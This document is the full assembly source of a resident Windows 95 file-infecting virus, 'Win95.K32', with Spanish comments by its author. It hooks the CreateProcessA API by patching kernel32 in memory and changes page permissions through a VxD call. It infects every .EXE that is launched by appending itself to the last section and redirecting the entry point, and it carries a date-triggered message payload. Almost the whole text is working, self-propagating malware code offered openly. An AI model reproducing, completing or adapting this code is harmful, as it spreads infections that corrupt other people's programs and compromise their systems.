;***********************************************************************
;*                                                                     * 
;*          VIRUS  WIN95.K32       By nIgr0                            * 
;*                                                                     *
;***********************************************************************
;
;  Virus residente, pa win95
;  Uso el espacio libre dejado por el header del kernel32
;    dentro de la primera p gina.
;  Parcheo el API CreateProcessA mediante un JMP
;  Modifico los permisos de las p ginas que voy a utilizar
;    mediante una llamada a CALLVXD0 (_PageModifyPermissions)
;    Vxd 01 servicio 0d.
;  Hallo la direccion de las apis a utilizar buscando en la
;    export table del kernel32 , supongo la direcci?n base del
;    kernel32.dll como 0bff70000h . La unica comprobaci?n que hago
;    al respecto es mirar en la pila [sp+3]=0b7h, con lo que 
;    por lo menos si no es 0bff70000h se acerca :)
;  Infecto aumentando la ultima secci?n del file y modifico el
;    entrypoint del file, pero no modifico los atributos de la ?ltima
;    secci?n aunque estos sean de solo lectura ,paso completamente de esos
;    atributos y luego mientras se ejecuta el virus este se pone los
;    atributos de pagina que quiera mediante el servicio
;     _PageModifyPermissions.
;



.386p
.model flat,STDCALL
include win32.inc

extrn      ExitProcess:PROC
extrn      MessageBoxA:PROC        ;apis exportadas unicamente en la primera
extrn      CreateProcessA:proc     ;generaci?n


;*********** Aqu? algunas equs interesantes ****************

viriisize  equ  (((offset end - offset start)+064h)/065h)*065h
K32        equ  0bff70000h
hueco      equ  0bffc0400h   ;Zona en el header 

GENERIC_READ    EQU     80000000H  ;abre archivo para lectura
GENERIC_WRITE   EQU     40000000H  ;abre el archivo para escritura
OPEN_EXISTING   EQU     3          ;usado por CreateFile para abrir archivo existente


.data

dummy    db    0                         ;de esta secci?n paso
mess     db    'nIgrO rUlez!!!$',0
text     db    'Virus Win95.K32 .... Ejecutado',0



.code
start:
        xor  eax,eax            ;este es el codigo de un Hoste Ficticio
        push eax
        lea  eax,mess
        push eax
        lea  eax,text
        push eax
        xor  eax,eax
        push eax
 
        nop
        nop
        nop
        nop
        nop

;       call MessageBoxA       



Lajodimos:

       Push  LARGE -1
       call  ExitProcess

;***************** Comienzo del Virus **********************

startvirii:
          cmp    byte ptr [esp+3],0bfh    ;verifico que se llama desde el
          jne    malasunto                ;la direcci?n bf??????h

          pushad                     ;pusheo tooo
          push  ebp

          call  getdesp              ;obtengo el delta
getdesp:  pop   ebp                     
          sub   ebp,offset getdesp

          jmp     saltito         ;jmp pa esquivar la zona de datos :)

;***************** Comienzo de la zona de Datos ***********

startdata:
PARCHE:    mov  eax,0bff70400h+offset starthook-offset startvirii
           jmp  eax
codigoparcheado:
            db     010h     dup (0)

FIRMA          db   'Virus K32 por nIgr0  ... "Hazlo o no lo hagas pero no lo intentes"',0
NLH            db   'nIgr0_lives_here!!!!',0
IOBYTES        dd    0h,0h
llamada        dd    0bff713d4h         ;direcci?n de CallVXD0 hallada anteriormente
hoste          db   'c:\virus\k32\K.EXE',0,'                                     '

ahand dd 0                   ; handle del virus que abro
peheaderoffset dd 0          ; Guardo el  offset del  peheader del archivo
ObjectTableoffset dd 0       ; Guardo el  offset de la object table en memoria
bytesread dd 0               ; numero de bytes que leo/escrito en el archivo

secdesplaza    dd 0h
secphy         dd offset startvirii- offset start
ultfisicalsize dd 0h

newobject:                   ; Zona en la que almaceno el ultimo objeto
oname db ".nigro",0,0        ; Pa modificarlo a placer
virtualsize    dd 0
RVA            dd 0
physicalsize   dd 0
physicaloffset dd 0
reserved dd 0,0,0
objectflags    dd 0h     

peheader:                ; Estructura del Pe header 
        signature        dd 0
        cputype          dw 0
        numObj           dw 0
        db       3*4     dup (0)
        NtHeaderSize     dw 0
        Flags            dw 0
        db      4*4      dup (0)
        entrypointRVA    dd 0
        db      3*4      dup (0)      
        objalign         dd 0
        filealign        dd 0
        db       4*4     dup (0)
        imagesize        dd 0
        headersize       dd 0
        db      400h     dup (0)

addresstable dd 00h        ;direccion de la addresstable en la export table
nametable    dd 00h        ;direccion la tabla de punteros a strings (de la export table)
ordinaltable dd 00h        ;puntero a la ordinal table
contador     dd 00h        ;pa calcular la posici?n del puntero en la nametable que
                           ;que apunte a la api buscada.
apiabuscar   dd 00h        ;offset donde se encuentra la string de la api a
                           ;buscar (es usada temporalmente por mi
                           ;procedimiento GetAdressAPi)
longitudapi  dd 00h

;************** Direcciones para las APIS *******************


nombreapis:
                  dd 010d
                  db 'CreateFile',0,'      '      ;strings de las apis que
                  dd 014d
                  db 'SetFilePointer',0,'  '      ;voy a utilizar
                  dd 08d
                  db 'ReadFile',0,'        '      ;junto con el tama¤o de la
                  dd 09d
                  db 'WriteFile',0,'       '      ;string
                  dd 011d
                  db 'CloseHandle',0,'     '
                  dd 014d
                  db 'CreateProcessA',0,'  '
                  dd 016d
                  db 'GetModuleHandleA',0
                  dd 014d
                  db 'GetProcAddress',0,'  '
direccionesapis:

newCreateFile       dd 00h  ;0bff7799ch      ;valores para mi versi?n de WIN :)
newSetFilePointer   dd 00h  ;0bff770e4h
newReadFile         dd 00h  ;0bff7594ah
newWriteFile        dd 00h  ;0bff75951h
newCloseFile        dd 00h  ;0bff7bc8bh
newCreateProcessA   dd 00h  ;0bff775e8h
newGetModuleHandleA dd 00h
newGetProcAddress   dd 00h

dllmensajito      db 'USER32.dll',0
apimensajito      db 'MessageBoxA',0

;***************** Fin de la Zona de datos ***********************


saltito:
          ;en eax viene el entrypoint del virii

       mov   ebx,eax    ;copia de seguridad

       xor     eax,eax            ;empiezo a calcular la direccion de CALLVXD0
       mov     esi,K32 + 3CH
       lodsw                      ;en ax me quedar  el comienzo del PE header

       add     eax,K32            ;a la que le suma la direcci?n base del Kernel32


       cmp     dword ptr [EAX],00004550H       ;verifico que es un PE header
       je      NoERROR

ERROR: jmp    melaspiro


NoERROR:
       mov     esi,[EAX + 78H]         ; 78H = la direcci?n a la export table
       add     esi,K32 + 1CH           ; 1CH RVA para la adress table

    
       lodsd                           ; en eax queda la RVA al primer ordinal
       add     eax,K32                 ; es decir la direcci?n a la CALLVXD0

       push    eax                     ;
       pop     esi                     ;en esi=eax

       lodsd                           ;obtengo la RVA de la primera API
       add     eax,K32                 ;EAX = La direcci?n de la primera API


       mov   edi,ebx
       and   edi,0fffff000h       ;calculo la pagina del virii
       ror   edi,012d
       push  eax
       call  modificarpermisos
       pop   eax
       
       and   ebx,00000fffh          ;verifico que no va a utilizar 2 paginas
       add   ebx,viriisize          ;en caso de que utilice 2 paginas , marco
       cmp   ebx,01000h             ;la segunda pagina tambien para escritura
       jl    continuar

       inc     edi
       push   eax
       call   modificarpermisos
       pop    eax
continuar:

       mov     [ebp+llamada],eax           ;salvo la direcci?n de CALLVXD0

       mov  eax,0bff70400h                 ;verifico que no est  residente 
       mov  ebx,dword ptr [eax]
       cmp  ebx,dword ptr [ebp+startvirii]
       je   yaresidente


       mov  ecx,08h                    ;numero de APis a buscar
       lea  esi,ebp+nombreapis
       lea  edi,ebp+direccionesapis
otraapi:                               ;obtengo la direccion de las apis
       push edi                        ;que voy a utilizar
       push esi
       push ecx
       call GetAddressApi
       pop  ecx
       pop  esi
       pop  edi
       mov  dword ptr [edi],eax
       add  edi,4h
       add  esi,021d
       dec  ecx
       jne otraapi               ;bueno en este punto tenemos las direcciones
                                 ;necesarias :)


      mov   eax,00002a00h
      call  INT_21                ;compruebo la fecha del sistema

      cmp   dh,02d
      jne   nopayload            ;fecha de activaci?n 19d de febrero
      cmp   dl,019d
      jne   nopayload

      lea    ebx,ebp+dllmensajito       ;Obtengo la direccion base de la
      push   ebx                        ;libreria USER32.dll donde reside 
      call   [ebp+newGetModuleHandleA]  ;el api MessageBoxA

      lea    ebx,ebp+apimensajito      
      push   ebx
      push   eax
      call   [ebp+newGetProcAddress]       ;obtengo la direccion de MessageBoxA

      push   0
      lea    ebx,ebp+NLH
      push   ebx
      lea    ebx,ebp+FIRMA
      push   ebx
      push   0
      call   eax                 ;llamo al api MessageBoxA
  

nopayload:

       mov   edi,0bff70h
       call  desprotegerpagina
       mov   edi,dword ptr [ebp+newCreateProcessA]
       and   edi,0fffff000h
       ror   edi,012d
       call  desprotegerpagina       ;desprotejo 2 paginas una para poder
                                     ;parchear el api y otra en la que
                                     ;quedar‚ residente
       inc    edi
       call  desprotegerpagina      ;y la siguiente 

       mov    esi,dword ptr [ebp+newCreateProcessA]
       lea    edi,ebp+codigoparcheado
       mov    ecx,010h
       rep    movsb                   ;copio los 10h primeros bytes del api
                                      ;CreateProcess
                                      ;para poder devolver el control al API
                                      ;cuando sea llamada.

       lea  esi,ebp+PARCHE
       mov  edi,dword ptr [ebp+newCreateProcessA]   ;pongo el jmp
       mov  ecx,010h                                ;en la API                                  ;del api
       rep  movsb

       lea     esi,ebp+startvirii
       mov     edi,0bff70400h
       mov     ecx,viriisize
       rep     movsb                   ;copio el virus en memoria

yaresidente:
melaspiro:
      popad
      pop ebp
malasunto:
      db  0b8h        ;esto es un mov eax,inm
oldip dd  0401000h    ;Ip de inicio
      jmp eax

enddata:
;*************** Modifica permisos de pagina *********************
                                             ;en eax la direccion de callvxd0
                                             ;y en edi la pagina a modificar

desprotegerpagina:                             ; LLamada a CALLVXD0
       mov     eax,dword ptr [ ebp + offset llamada]
modificarpermisos:
       push    020060000h    ;nuevos atributos de p gina
       push    00h
       push    01h
       push    edi
       push    001000dh      ;llamada a la VXD 1 servicio D (_PageModifyPermissions)
       call    eax
       ret

;**************** Rutina para llamar a la int 21h **********************

INT_21:                             ; LLamada a la INT 21
       push    ecx
       push    eax
       push    002a0010h
       mov     eax,dword ptr [ ebp + offset llamada]
       call    eax
       RET

;************** Procedimiento que encuentra la direccion de las apis ***************
;**************           en la export table del Kernel32            ***************

GetAddressApi:
        mov    eax,dword ptr [esi]
        mov    dword ptr [ebp+longitudapi],eax
        add    esi,04h
        mov    dword ptr [ebp+apiabuscar],esi  ;pusheo el valor de la string

        xor     eax,eax
        mov     dword ptr [ebp+contador],eax    ;pongo a cero el valor del contador
        mov     esi,K32 + 3CH
        lodsw                      ;en ax me quedar  el comienzo del PE header

        add     eax,K32            ;a la que le suma la direcci?n base del Kernel32

        mov     esi,[EAX + 78H]         ; 78H = la direcci?n a la export table
        add     esi,K32 + 1cH           ; 1CH RVA para la adress table

    
        lodsd                           ;obtengo los offset de algunas TABLAS
        add     eax,K32                 ;interesantes de la export table
        mov     dword ptr [ebp+addresstable],eax
        lodsd
        add     eax,K32
        mov     dword ptr [ebp+nametable],eax
        lodsd
        add     eax,K32
        mov     dword ptr [ebp+ordinaltable],eax

;ADDRESS TABLE RVA = DD Relative Virtual Address of the Export Address
;Table.
;NAME TABLE RVA = DD Relative Virtual Address of the Export Name Table
;Pointers.
;ORDINAL TABLE RVA = DD Relative Virtual Address of Export Ordinals


        mov    eax,dword ptr [ebp+nametable]
        mov    esi,eax
anotherapi:
        push    esi
        lodsd
        mov     esi,eax
        add     esi,K32
        mov     edi,dword ptr [ebp+apiabuscar]
        mov     ecx,dword ptr [ebp+longitudapi];en ecx el numero de bytes
        cld                                    ;con los que compararemos
        repe   cmpsb
        je     encontrada
        pop    esi
        add    esi,04h
        inc    dword ptr [ebp+contador]
        jmp    anotherapi

encontrada:
       pop   esi

       xor   eax,eax
       mov   eax,dword ptr [ebp+contador]
       add   eax,eax
       add   eax,dword ptr [ebp+ordinaltable] ;Con el valor de contador
       mov   esi,eax                          ;me voy a la ordinal table
       lodsw                                  ;y busco el ordinal del API
       and   eax,0000ffffh
       add   eax,eax
       add   eax,eax
       add   eax,dword ptr [ebp+addresstable]  ;Y con el ordinal me voy a la
       mov   esi,eax                           ;adress table
       lodsd
       add   eax,K32         ;devuelvo en eax la direccion del API
       ret


;***************************************************************************
;*                                                                         *           
;*       Comienzo de la Rutina que intercepa la API CreateProcessA         *
;*                                                                         *
;***************************************************************************


starthook:
           push  ebp
           call  getdelta               ;obtengo el delta 
getdelta:  pop   ebp                     
           sub   ebp,offset getdelta

           
           mov  eax,[esp+0ch] ;obtengo el puntero a la cadena de texto
                              ;de la pila :)
           pushad                ;pusheo tooo

           mov  esi,eax              
           lea  edi,ebp+hoste
otrocar:   cmp  byte ptr [esi],0      ;copio la cadena de texto con el nombre
           je   sacabo                ;de la victima en la variable hoste
           movsb
           jmp otrocar
sacabo:    movsb        ;copio el 0 tambi‚n

           lea  esi,ebp+hoste
           cmp  byte ptr [esi],022h
           jne   proseguir                ;rehago el string por si est 
                                          ;entre comillas
           lea  edi,ebp+hoste
           inc  esi
mascara:   cmp  byte ptr [esi],022h
           je   finalizar
           movsb
           jmp mascara
finalizar: mov  byte ptr [esi],0h
           movsb
proseguir: cmp  word ptr [edi-3h],'EX'
           je   esunexe
           cmp  word ptr [edi-3h],'ex'
           je   esunexe
           jmp  emergencia
esunexe:
        lea     esi,ebp+hoste           ;Abro el archivo
        xor     eax,eax 
        push    eax     
        push    eax
        push    large OPEN_EXISTING
        push    eax
        push    eax
        push    large GENERIC_READ or GENERIC_WRITE
        mov     eax,esi     
        push    eax                            
        call    dword ptr[ebp + newCreateFile]
        cmp     eax,-1                         
        je      emergencia



        mov dword ptr [ebp + offset ahand],eax   ; Guardo el handle


        ; Busco el comienzo del PE header que est  en la posici?n 3ch

        mov     edx,03ch
        call    moverpuntero

           ; Leo la posici?n del Pe header

        mov  ecx,004h
        lea  edx,[ebp + offset peheaderoffset]
        call lectura

           ; Me muevo hasta el PE header

        mov     edx,dword ptr [ebp+offset peheaderoffset]
        call    moverpuntero

         
           ; Leo un poco del header para calcular todo el tama¤o del
           ; pe header y object table

        mov ecx,058h
        lea edx,[ebp + offset peheader]
        call lectura

      ; Llevo el puntero al comienzo del PE header de nuevo
        mov     edx,dword  ptr [ebp+ offset peheaderoffset]
        call    moverpuntero

      ; leo todo el pe header  y la object table
      mov ecx,dword ptr [ebp + offset headersize]
      lea edx,[ebp + offset peheader]
      call   lectura  
      


      ; Me aseguro que es un pe y que no est  infectado
      cmp dword ptr [ebp + offset peheader],00004550h    ; PE,0,0
      jnz notape
      cmp word ptr [ebp + offset peheader + 4ch],00badh ;si est  infectado salir
      jz notape


       ; marco el archivo como infectado en una zona del Header
       mov word ptr [ebp + offset peheader + 4ch],00badh


     ; Localizo el offset de la object table
      xor eax,eax
      mov ax, word ptr [ebp + offset NtHeaderSize]
      add eax,18h
      mov dword ptr [ebp + offset ObjectTableoffset],eax

     ;relativo al comienzo del Pe header

        
     ;Calculo el Offset del ?ltimo  objecto de la tabla
      mov esi,dword ptr [ebp + offset ObjectTableoffset]
      lea eax,[ebp + offset peheader]
      add esi,eax
      xor eax,eax
      mov ax,[ebp + offset numObj]
      mov ecx,40d
      xor edx,edx
      mul ecx
      add esi,eax

      sub esi,40d

      lea edi,[ebp + offset newobject]

      mov ecx,10d
      push esi
      push edi
      rep movsd      ;copio la entrada en la object table en memoria
    

         mov eax,dword ptr [ebp + offset physicalsize]
         mov dword ptr [ebp + offset ultfisicalsize],eax
         mov dword ptr [ebp + offset secphy],eax

         ; Calcula el tama¤o fisico pa el ultimo object
         mov ecx,dword ptr [ebp + offset filealign]
         mov eax,dword ptr [ebp + offset physicalsize]
         add eax,viriisize
         xor edx,edx
         div ecx
         inc eax
         mul ecx
         mov dword ptr [ebp + offset physicalsize],eax

         mov eax,dword ptr [ebp + offset virtualsize]
         mov dword ptr [ebp+ offset secdesplaza],eax ;el tama¤o virtual ser 
                                                     ;el desplazamiento dentro de la secci?n
                    ;RVA del objeto + desplazamiento virtual= entrypoint RVA   

         ; calcula el tama¤o virtual del objeto modificado
         mov ecx,dword ptr [ebp + offset objalign]
         mov eax,dword ptr [ebp + offset virtualsize]
         add eax,viriisize
         xor edx,edx
         div ecx
         inc eax
         mul ecx
         mov dword ptr [ebp + offset virtualsize],eax


         ; Modifico la image size del archivo.

         mov eax,viriisize
         add eax,dword ptr [ebp + offset imagesize]
         mov ecx,[ebp + offset objalign]
         xor edx,edx
         div ecx
         inc eax
         mul ecx
         mov dword ptr [ebp + offset imagesize],eax

        ; Copio el objeto modificado en el buffer

        pop esi
        pop edi
        mov ecx,10d
        rep movsd


        ; Calculo la nueva Entrypoint RVA
        mov eax,dword ptr [ebp + offset RVA]
        add eax,dword ptr [ebp + offset secphy]
        mov ebx,dword ptr [ebp + offset entrypointRVA]
        mov dword ptr [ebp + offset entrypointRVA],eax
        
        add  ebx,dword ptr [ebp + offset peheader + 34h] ;le sumo la base adress
        mov dword ptr [ebp + offset oldip],ebx

                              ;completo la variable oldip para generar
                              ;el jump al hoste
        

        ; de nuevo al Pe header
        mov     edx,dword ptr [ebp+offset peheaderoffset]
        call    moverpuntero
        
        ; Escribo el pe header y la object table en el archivo

        mov ecx,dword ptr [ebp + offset headersize]
        lea edx,[ebp + offset peheader]
        call escritura

        ; Me voy al final del file para copiar el virus
        mov  edx,dword ptr [ebp + offset physicaloffset]
        add  edx,dword ptr [ebp + offset ultfisicalsize]
        call moverpuntero


        ; Copio el virus al final (de la ultima secci?n)
        mov ecx,viriisize
        lea edx,[ebp + offset startvirii]
        call escritura


notape:
        push    dword ptr [ebp + ahand]
        call    dword ptr [ebp + newCloseFile]


emergencia:

          lea  esi,ebp+codigoparcheado
          mov  edi,dword ptr [ebp+newCreateProcessA]   ;pongo otra vez
          mov  ecx,010h                                ;los 010h primeros bytes
          rep  movsb                                   ;del api


          popad
          pop  ebp

          call  getdelta2               ;obtengo el delta otra vez
getdelta2:pop   eax                     
          sub   eax,offset getdelta2


          pop   dword ptr [eax+dirretorno]
          call  dword ptr [eax+newCreateProcessA]  ;llamo a la api

          push  ebp
          call  getdelta3               ;obtengo el delta otra vez
getdelta3:pop   ebp                     
          sub   ebp,offset getdelta3

          pushad
        
          lea  esi,ebp+PARCHE
          mov  edi,dword ptr [ebp+newCreateProcessA]   ;pongo otra vez
          mov  ecx,010h                                ;el parche                                   ;del api
          rep  movsb
          popad
          pop  ebp
          db  068h   ;opcode de un push
dirretorno  dd 00h
          ret

lectura:                                ;Llamada al api ReadFile
        push    large 0                 ;En ecx: Numero de bytes a leer
        lea     eax,[ebp +IOBYTES]      ;En edx: el offset del buffer        
        push    eax
        push    ecx
        push    edx
        push    dword ptr [ebp + ahand]
        call    dword ptr [ebp + newReadFile]
        ret

moverpuntero:                             ;Llamada al api SetFilePointer
        push    LARGE 0                   ;en edx: el offset del archivo              
        push    LARGE 0                         
        push    edx
        push    dword ptr [ebp + ahand]
        call    dword ptr [EBP + newSetFilePointer]
        ret

escritura:                                 ;Llamada al api WriteFile
                                           ;en ecx: bytes a escribir
                                           ;en edx: offset del buffer
        push    LARGE 0
        LEA     eax,[ebp + IOBYTES]             
        push    eax                             
        push    ecx                             
        push    edx                             
        push    dword ptr [ebp + ahand]       
        call    dword ptr [ebp + newWriteFile]    
jur:    ret

endhook:
endvirii:
end:
        end   startvirii



 
 





